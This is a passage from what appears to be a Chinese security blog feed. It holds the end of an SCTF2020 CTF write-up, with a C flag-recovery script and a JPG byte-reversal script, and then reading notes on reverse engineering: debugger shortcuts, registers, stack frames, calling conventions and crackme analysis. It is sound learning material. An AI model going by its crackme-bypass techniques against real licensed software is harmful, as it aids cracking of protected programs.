class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> od[<span class="number">256</span>] = &#123;<span class="number">0x00000031</span>, <span class="number">0x00000050</span>, <span class="number">0x00000052</span>, <span class="number">0x000000C1</span>, <span class="number">0x000000CD</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000007</span>, <span class="number">0x00000039</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000004</span>, </span><br><span class="line"><span class="number">0x000000FD</span>, <span class="number">0x000000C4</span>, <span class="number">0x0000002A</span>, <span class="number">0x00000072</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000060</span>, <span class="number">0x000000E3</span>, <span class="number">0x000000BD</span>, <span class="number">0x000000E2</span>, <span class="number">0x00000061</span>, </span><br><span class="line"><span class="number">0x000000E4</span>, <span class="number">0x00000063</span>, <span class="number">0x000000EA</span>, <span class="number">0x000000FF</span>, <span class="number">0x000000FE</span>, <span class="number">0x00000009</span>, <span class="number">0x000000F9</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000CE</span>, <span class="number">0x0000009E</span>, </span><br><span class="line"><span class="number">0x00000025</span>, <span class="number">0x0000006A</span>, <span class="number">0x0000004C</span>, <span class="number">0x000000DC</span>, <span class="number">0x00000013</span>, <span class="number">0x000000F0</span>, <span class="number">0x00000083</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000024</span>, <span class="number">0x000000DB</span>, </span><br><span class="line"><span class="number">0x000000DD</span>, <span class="number">0x0000007F</span>, <span class="number">0x000000EF</span>, <span class="number">0x0000008C</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000E1</span>, <span class="number">0x00000026</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000092</span>, <span class="number">0x00000006</span>, </span><br><span class="line"><span class="number">0x000000F7</span>, <span class="number">0x00000096</span>, <span class="number">0x000000D0</span>, <span class="number">0x000000B4</span>, <span class="number">0x000000E7</span>, <span class="number">0x000000F8</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000078</span>, <span class="number">0x000000F2</span>, <span class="number">0x000000AA</span>, </span><br><span class="line"><span class="number">0x00000044</span>, <span class="number">0x00000032</span>, <span class="number">0x00000036</span>, <span class="number">0x0000005A</span>, <span class="number">0x000000EC</span>, <span class="number">0x000000A6</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000008</span>, <span class="number">0x000000C0</span>, <span class="number">0x0000002E</span>, </span><br><span class="line"><span class="number">0x0000009B</span>, <span class="number">0x00000084</span>, <span class="number">0x00000055</span>, <span class="number">0x0000009C</span>, <span class="number">0x000000AE</span>, <span class="number">0x00000065</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000053</span>, <span class="number">0x00000088</span>, </span><br><span class="line"><span class="number">0x00000049</span>, <span class="number">0x00000046</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000059</span>, <span class="number">0x0000007E</span>, <span class="number">0x000000E5</span>, <span class="number">0x000000B3</span>, <span class="number">0x000000F6</span>, </span><br><span class="line"><span class="number">0x00000048</span>, <span class="number">0x0000001A</span>, <span class="number">0x000000D1</span>, <span class="number">0x000000A4</span>, <span class="number">0x00000067</span>, <span class="number">0x0000006B</span>, <span class="number">0x000000BA</span>, <span class="number">0x00000087</span>, <span class="number">0x00000073</span>, <span class="number">0x0000004B</span>, </span><br><span class="line"><span class="number">0x000000A2</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000018</span>, <span class="number">0x000000D4</span>, <span class="number">0x000000BB</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000070</span>, <span class="number">0x00000093</span>, <span class="number">0x000000AC</span>, </span><br><span class="line"><span class="number">0x0000000F</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000051</span>, <span class="number">0x000000B5</span>, <span class="number">0x00000021</span>, <span class="number">0x00000085</span>, <span class="number">0x00000045</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000009F</span>, </span><br><span class="line"><span class="number">0x00000081</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x00000095</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000016</span>, <span class="number">0x000000D2</span>, <span class="number">0x000000C7</span>, <span class="number">0x000000E0</span>, <span class="number">0x000000DA</span>, </span><br><span class="line"><span class="number">0x00000058</span>, <span class="number">0x000000A9</span>, <span class="number">0x0000001E</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000C2</span>, <span class="number">0x00000069</span>, <span class="number">0x00000071</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000075</span>, </span><br><span class="line"><span class="number">0x000000BC</span>, <span class="number">0x00000066</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000030</span>, <span class="number">0x000000AD</span>, <span class="number">0x00000099</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000077</span>, <span class="number">0x00000041</span>, <span class="number">0x00000097</span>, </span><br><span class="line"><span class="number">0x00000022</span>, <span class="number">0x000000B8</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000D3</span>, <span class="number">0x00000047</span>, <span class="number">0x000000C6</span>, <span class="number">0x00000079</span>, <span class="number">0x00000014</span>, <span class="number">0x0000000B</span>, <span class="number">0x000000F4</span>, </span><br><span class="line"><span class="number">0x0000003F</span>, <span class="number">0x00000011</span>, <span class="number">0x0000002B</span>, <span class="number">0x000000DE</span>, <span class="number">0x000000EE</span>, <span class="number">0x000000F3</span>, <span class="number">0x000000F5</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000A5</span>, <span class="number">0x00000086</span>, </span><br><span class="line"><span class="number">0x00000091</span>, <span class="number">0x000000BE</span>, <span class="number">0x0000008E</span>, <span class="number">0x0000008F</span>, <span class="number">0x000000E8</span>, <span class="number">0x000000E6</span>, <span class="number">0x000000B1</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000037</span>, <span class="number">0x000000D5</span>, </span><br><span class="line"><span class="number">0x000000FC</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000042</span>, <span class="number">0x000000CA</span>, <span class="number">0x00000035</span>, <span class="number">0x000000C8</span>, <span class="number">0x0000006E</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000089</span>, </span><br><span class="line"><span class="number">0x00000015</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000003</span>, <span class="number">0x0000008A</span>, <span class="number">0x0000008D</span>, <span class="number">0x000000D8</span>, <span class="number">0x00000076</span>, <span class="number">0x000000CB</span>, <span class="number">0x000000C5</span>, <span class="number">0x000000F1</span>, </span><br><span class="line"><span class="number">0x0000006C</span>, <span class="number">0x000000B9</span>, <span class="number">0x00000017</span>, <span class="number">0x00000064</span>, <span class="number">0x00000068</span>, <span class="number">0x000000E9</span>, <span class="number">0x00000056</span>, <span class="number">0x00000029</span>, <span class="number">0x00000090</span>, <span class="number">0x000000ED</span>, </span><br><span class="line"><span class="number">0x00000074</span>, <span class="number">0x0000000D</span>, <span class="number">0x000000EB</span>, <span class="number">0x000000B0</span>, <span class="number">0x000000A1</span>, <span class="number">0x00000094</span>, <span class="number">0x00000080</span>, <span class="number">0x000000C9</span>, <span class="number">0x0000007C</span>, <span class="number">0x000000B7</span>, </span><br><span class="line"><span class="number">0x00000028</span>, <span class="number">0x00000005</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000023</span>, <span class="number">0x0000009D</span>, <span class="number">0x000000A0</span>, <span class="number">0x00000027</span>, <span class="number">0x00000098</span>, <span class="number">0x00000043</span>, <span class="number">0x0000007D</span>, </span><br><span class="line"><span class="number">0x000000BF</span>, <span class="number">0x0000004F</span>, <span class="number">0x00000012</span>, <span class="number">0x00000034</span>, <span class="number">0x000000A8</span>, <span class="number">0x000000D9</span>, <span class="number">0x00000057</span>, <span class="number">0x00000033</span>, <span class="number">0x0000009A</span>, <span class="number">0x00000001</span>, </span><br><span class="line"><span class="number">0x00000054</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000062</span>, <span class="number">0x00000038</span>, <span class="number">0x000000FB</span>, <span class="number">0x00000082</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000003A</span>, <span class="number">0x00000019</span>, </span><br><span class="line"><span class="number">0x0000005D</span>, <span class="number">0x000000B6</span>, <span class="number">0x00000040</span>, <span class="number">0x00000020</span>, <span class="number">0x000000CC</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0x00000080</span>, <span class="number">0x00000055</span>, <span class="number">0x0000007E</span>, <span class="number">0x0000002D</span>, <span class="number">0x000000D1</span>, <span class="number">0x00000009</span>, <span class="number">0x00000025</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000056</span>, </span><br><span class="line"><span class="number">0x00000095</span>, <span class="number">0x000000C4</span>, <span class="number">0x00000036</span>, <span class="number">0x00000013</span>, <span class="number">0x000000ED</span>, <span class="number">0x00000072</span>, <span class="number">0x00000024</span>, <span class="number">0x00000093</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000C8</span>, </span><br><span class="line"><span class="number">0x00000045</span>, <span class="number">0x000000EC</span>, <span class="number">0x00000016</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000067</span>, <span class="number">0x0000001D</span>, <span class="number">0x000000F9</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000096</span>, <span class="number">0x000000D9</span>, </span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v6 = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v11 = (v11 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v10 = (*(od + v11) + v10) % <span class="number">256</span>;</span><br><span class="line">*(od +  v11) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    *(od +  v10) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    *(od +  v11) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    v6 = (*(od +  v10) + *(od +  v11)) % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">    temp = j;</span><br><span class="line">    temp ^= *(od +  v6);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(temp == a[i])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">flag[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<img src="/2020/07/10/SCTF2020/image-20200714153241364.png" alt="image-20200714153241364"></p><p>下面使用idcpython脚本执行来得到改写的区段，首先ctrl+s查看区段的首地址：<img src="/2020/07/10/SCTF2020/image-20200714161123125.png" alt="image-20200714161123125"></p><p>shift+f2输入要执行的脚本，执行：<img src="/2020/07/10/SCTF2020/image-20200714161222707.png" alt="image-20200714161222707"></p><p>得到改写的数据后，先u让数据未定义，再p转化为函数。<img src="/2020/07/10/SCTF2020/image-20200714162237927.png" alt="image-20200714162237927"></p><p><strong>总结：多猜测，对数据的敏感性，这道题开始想到是hash简单很多。</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>直接挂VPN进入所给网址：<img src="/2020/07/10/SCTF2020/image-20200720211239002.png" alt="image-20200720211239002"></p><h3 id="Easymisc"><a href="#Easymisc" class="headerlink" title="Easymisc"></a>Easymisc</h3><p>附件下载后是一张图片，图片名字是倒序的且打不开。</p><p>拖进010editor发现jpg图片的尾巴格式但是倒序的，结合图片名字可以知道要将图片的信息倒序，这里注意是成对的倒序还是一个一个倒序。<img src="/2020/07/10/SCTF2020/image-20200720212540806.png" alt="image-20200720212540806"></p><p>复制出数据的十六进制格式，写python脚本倒序写入文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">s = <span class="string">'复制的图片的二进制信息‘</span></span><br><span class="line"><span class="string">s = s[::-1]</span></span><br><span class="line"><span class="string">with open('</span>flag.jpg<span class="string">', "wb") as f:</span></span><br><span class="line"><span class="string">    for i in range(0, len(s), 2):</span></span><br><span class="line"><span class="string">        n = s[i]+s[i+1]</span></span><br><span class="line"><span class="string">        ans = struct.pack('</span>B<span class="string">', int(n, 16))</span></span><br><span class="line"><span class="string">        f.write(ans)</span></span><br><span class="line"><span class="string">f.close()</span></span><br></pre></td></tr></table></figure><p>得到逆序后的文件，补齐jpg图片的文件头后打开图片：<img src="/2020/07/10/SCTF2020/image-20200720213434806.png" alt="image-20200720213434806">f</p><p>发现不对，看看图片属性：<img src="/2020/07/10/SCTF2020/image-20200720213644954.png" alt="image-20200720213644954"></p><p>最后载入010editor发现更多的信息：<img src="/2020/07/10/SCTF2020/image-20200720213808864.png" alt="image-20200720213808864"></p><p>最后找在线网站进行rc4解密：<img src="/2020/07/10/SCTF2020/image-20200720213948350.png" alt="image-20200720213948350"></p><h3 id="doudizhu"><a href="#doudizhu" class="headerlink" title="doudizhu"></a>doudizhu</h3><p>直接玩游戏通关，有游戏体验。。哈哈</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理读书笔记</title>
      <link href="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>PS：本书将指引你进入美妙又刺激的代码逆向分析世界，开启一段神奇之旅！</strong><a id="more"></a></p><h2 id="第二章-逆向分析-Hello-World-程序"><a href="#第二章-逆向分析-Hello-World-程序" class="headerlink" title="第二章 逆向分析 Hello World!程序"></a>第二章 逆向分析 Hello World!程序</h2><h3 id="OD常用快捷键"><a href="#OD常用快捷键" class="headerlink" title="OD常用快捷键"></a>OD常用快捷键</h3><ul><li>执行到返回：ctrl+F9</li></ul><ul><li>重新开始：ctrl+F2</li></ul><ul><li>执行到光标处：F4</li></ul><ul><li>编辑数据：ctrl+E</li></ul><ul><li>编写汇编代码：空格</li></ul><ul><li>注释：；</li></ul><ul><li>设置标签：：</li></ul><h3 id="设置程序大本营"><a href="#设置程序大本营" class="headerlink" title="设置程序大本营"></a>设置程序大本营</h3><p>1.先对所要设置的语句设置一个标签，再通过查看已经设置的标签找到。同时标签可以让代码变得非常直观。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701143813355.png" alt="image-20200701143813355"></p><p>2.与标签相同的方法，只不过使用 ；，再查看已经设置的注释。</p><p>3.设置断点。</p><p>4.使用命令跳转命令：ctrl+G</p><h3 id="快速查找指定代码"><a href="#快速查找指定代码" class="headerlink" title="快速查找指定代码"></a>快速查找指定代码</h3><p>1.API检索法（1）：在调用代码中设置断点。</p><ul><li>在事先推测出代码要使用API后，鼠标右键菜单-查找-所有模块间之间的调用。找到指定函数后双击查看。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701144638966.png" alt="image-20200701144638966"></li></ul><p>2.API检索法（2）：在API代码中设置断点。</p><ul><li>鼠标右键菜单-查找-所有模块名称，列出被加载的DLL文件中提供的所有API。找到函数，进入下断点，F9执行，在该函数停下后，使用ctrl+F9执行到ret，最后F7回到被调用函数的下一条语句处。</li></ul><hr><h2 id="第三章-小端序标记法"><a href="#第三章-小端序标记法" class="headerlink" title="第三章 小端序标记法"></a>第三章 小端序标记法</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li><p>字节序：多字节数据在计算机内存中存储或网络传输时各字节的存储顺序。主要二大类：大端与小端。</p></li><li><p>大端：高地址存放数据的低位，低地址存放数据的高位。</p></li><li><p>小端：高地址存放数据的高位，低地址存放数据的地位。</p></li></ul><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><ul><li>大端序常用于大型UNIX服务器的RISC系列的CPU与网络传输协议中。</li><li>小端序，Intel x86 Cpu采用的序列。</li></ul><hr><h2 id="第四章-IA-32寄存器基本详解"><a href="#第四章-IA-32寄存器基本详解" class="headerlink" title="第四章 IA-32寄存器基本详解"></a>第四章 IA-32寄存器基本详解</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>寄存器：CPU内部用来存放数据的一些小型存储区域。它集成在CPU内部，拥有非常高的读写速度。</p><h3 id="基本程序运行寄存器"><a href="#基本程序运行寄存器" class="headerlink" title="基本程序运行寄存器"></a>基本程序运行寄存器</h3><p>1.通用寄存器（32位 8个）：EAX，EBX，ECX，EDX，ESI，EDI，EBP，ESP</p><p><strong>ps：为了实现对低16位寄存器的兼容，各寄存器又可分为高：H（high），低（L：low）几个独立的寄存器。</strong></p><ul><li>EAX：（0-31）32位</li><li>AX：（0-15）EAX的低16位</li><li>AH：（8-15）AX的高8位</li><li>AL：（0-7）AX的低8位</li></ul><p>EAX：（针对操作数和结果数据的）累加器</p><p>EBX：（DS段中的数据指针）基址寄存器</p><p>ECX：（字符串和循环操作的）计数器</p><p>EDX：（I/O指针）数据寄存器</p><p><strong>ps：以上4个寄存器主要用在算术运算之路中，常常用于保存常量与变量的值，EAX一般用在函数返回值中。</strong></p><p>EBP：（SS段中栈内数据指针）拓展基址指针寄存器</p><p>ESI：（字符串操作源指针）源变址寄存器</p><p>EDI：（字符串操作目标指针）目的变址寄存器</p><p>ESP：（SS段中栈指针）栈指针寄存器</p><p><strong>ps：以上四个寄存器常用作保存内存地址的指针。</strong></p><p>2.段寄存器（16位 6个）：CS，DS，SS，ES，FS，GS</p><ul><li><p>CS：代码段寄存器</p></li><li><p>SS：栈段寄存器</p></li><li><p>DS：数据段寄存器</p></li><li><p>ES：附加数据段寄存器</p></li><li><p>FS：数据段寄存器</p></li><li><p>GS：数据段寄存器</p></li></ul><p>3.程序状态与控制寄存器：ELFLAGS寄存器的每位都有意义，每位的值为0或1。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701190155792.png" alt="image-20200701190155792"></p><p>常见的三个：</p><ul><li>ZF：若运算结果为0，则其值为1，否则为0</li><li>OF：有符号整数溢出时，OF值被置为1。此外，MSB(最高有效位)改变时，其值也被设为1</li><li>CF：无符号整数溢出时，其值被置为1</li></ul><p>4.指令指针寄存器（EIP）：保存着CPU要执行指令的地址，每执行完一条指令就会通过EIP寄存器读取下一条指令。</p><hr><h2 id="第五章-栈"><a href="#第五章-栈" class="headerlink" title="第五章 栈"></a>第五章 栈</h2><p>栈：其实是一种数据结构，它按照FILO（先进后出）的原则存储数据。用于存储局部变量，传递函数参数，保存函数的返回地址。</p><p>这里拿之前在PWN学习过程中对栈学习后的图做补充。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200609114209670-1593603250485.png" alt="image-20200609114209670"></p><hr><h2 id="第六章-分析abex’-crackme-1"><a href="#第六章-分析abex’-crackme-1" class="headerlink" title="第六章 分析abex’ crackme#1"></a>第六章 分析abex’ crackme#1</h2><ul><li>使用VC++，VC，Delphi等开发工具编写的程序，除了自己编写的代码外，还有一部分启动函数由编译器添加的。但是如果使用汇编语言编写程序，汇编代码直接变为反汇编代码，main()函数直接出现在EP中。</li><li>GetDriveType()函数：获取C驱动器的类型（大部分返回的是HDD类型）。</li><li>注意调用Win32 API后，某些特定寄存器的值就会改变。</li></ul><hr><h2 id="第七章-栈帧"><a href="#第七章-栈帧" class="headerlink" title="第七章 栈帧"></a>第七章 栈帧</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><ul><li><p>栈帧：利用EBP（栈帧指针）寄存器访问栈内的局部变量，参数，函数返回地址的手段。</p></li><li><p>函数开始时，会先通过<code>push ebp;mov ebp, esp;</code>生成与其对应的栈帧。函数结束时会通过<code>mov esp, ebp;pop ebp;（leave）</code>删除栈帧。</p></li><li><p>最新的编译器都有一个优化选项，使用该选项编译简单的函数将不会产生栈帧。</p></li></ul><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li><p>函数中局部变量使用sub esp xx；开辟空间；函数结束后，参数传递使用的栈空间使用add esp xx；进行清理。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702190509071.png" alt="image-20200702190509071"></p></li><li><p>在栈窗口中，点击鼠标右键，选择地址后可以选择栈相对于那个寄存器的偏移来显示，可以让栈空间更直观。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702190825336.png" alt="image-20200702190825336"></p></li><li><p>对于原来以EBP表示的函数局部变量，可以通过使用快捷键<strong>alt+o</strong>，然后选择分析1，将<strong>显示函数中的局部变量与参数</strong>的选项勾上。那我们的在OD中看到的局部变量将会被表示成：LOCAL.n，参数表示成：ARG.n。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702191428951.png" alt="image-20200702191428951"></p></li><li><p>函数调用规则：cdecl：函数调用者（Caller）负责清理储存在栈中的参数。</p><p>​                          stdcall：被调用者（Callee）负责清理保存在栈中的参数。</p></li><li><p>XOR命令：异或运算，由于XOR命令比MOV EAX，0命令执行速度快，所以常用于寄存器初始化操作。</p></li></ul><hr><h2 id="第八章-abex’-crackme-2"><a href="#第八章-abex’-crackme-2" class="headerlink" title="第八章 abex’ crackme #2"></a>第八章 abex’ crackme #2</h2><p>第一次分析vb写的程序，开始很不适应，后面从对象出发还是好很多，但始终还是不如VC写的简单，还是自己能力不够。</p><h3 id="VB编写程序的介绍"><a href="#VB编写程序的介绍" class="headerlink" title="VB编写程序的介绍"></a>VB编写程序的介绍</h3><p>事件处理程序：VB主要用来编写GUI程序。由于VB程序采用windows操作系统的系统的事件驱动方式工作，所以在main()或WinMain()中并不存在用户代码(即我们希望调试的代码)，用户代码存在于各个事件处理程序中。</p><p>未文档化的结构体：VB中使用的各种信息以结构体形式保存在文件内部。由于微软未正式公开这种结构体信息，所以调试VB文件会难一些。</p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先调用VB引擎主函数（ThunRTMain）<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704125816635.png" alt="image-20200704125816635"></p><p>这里直接从事件处理程序开始<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141338867.png" alt="image-20200704141338867"></p><p>获取输入的name字符串<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141442295.png" alt="image-20200704141442295"></p><p>长度比较<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141501224.png" alt="image-20200704141501224"></p><p>使用name生成密码<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141533793.png" alt="image-20200704141533793"></p><p>最后，比较密码<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141550425.png" alt="image-20200704141550425"></p><p>难点：程序中处理的每个数据都是对象，调试时不易看，且程序中函数太多。</p><hr><h2 id="第九章-Process-Explorer"><a href="#第九章-Process-Explorer" class="headerlink" title="第九章 Process Explorer"></a>第九章 Process Explorer</h2><p>积累一个新工具：进程管理。</p><p>可以显示电脑中运行每个进程哦PID，CPU占有率，注册信息，终止进程。</p><hr><h2 id="第十章-函数调用约定"><a href="#第十章-函数调用约定" class="headerlink" title="第十章 函数调用约定"></a>第十章 函数调用约定</h2><p>三种主要的函数调用约定：cdecl（C语言默认调用），stdcall（使用_stdcall关键字来使用stdcall方式编译），fastcall</p><p>它们通过栈来传递参数的方式都是一样的，区别在于清理栈的过程。</p><p>cdecl：函数调用者清理压入栈的参数。在调用函数之后通过：add esp xxx;</p><p>stdcall：被调用者清理栈。如RETN 8;命令，它的含义就是：RETN+POP 8字节，返回后使esp增加指定大小。（Win 32 API 使用stdcall方式，这个方式可以获得更好的兼容性，使C语言之外的其他语言也能直接调用API）</p><p>fastcall：前2个参数会使用ECX与EDX寄存器传递参数，实现对函数的快速调用。其他与stdcall相似。</p><hr><h2 id="第十一章-视频讲座"><a href="#第十一章-视频讲座" class="headerlink" title="第十一章 视频讲座"></a>第十一章 视频讲座</h2><p>收获两点：1.查看传入一个函数的参数个数。2.neg指令与sbb指令。</p><p>1.查看传入函数参数个数：首先判断函数调用约定，再在函数调用前后查看栈情况即可。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203210059.png" alt="image-20200704203210059"></p><p>函数调用后，两次的esp只差即为使用栈空间传递参数大小。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203311197.png" alt="image-20200704203311197"></p><p>2.neg指令的操作对象是0则CF=0，否则CF=1<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203750309.png" alt="image-20200704203750309"></p><hr><h2 id="第十三章-PE文件格式"><a href="#第十三章-PE文件格式" class="headerlink" title="第十三章 PE文件格式"></a>第十三章 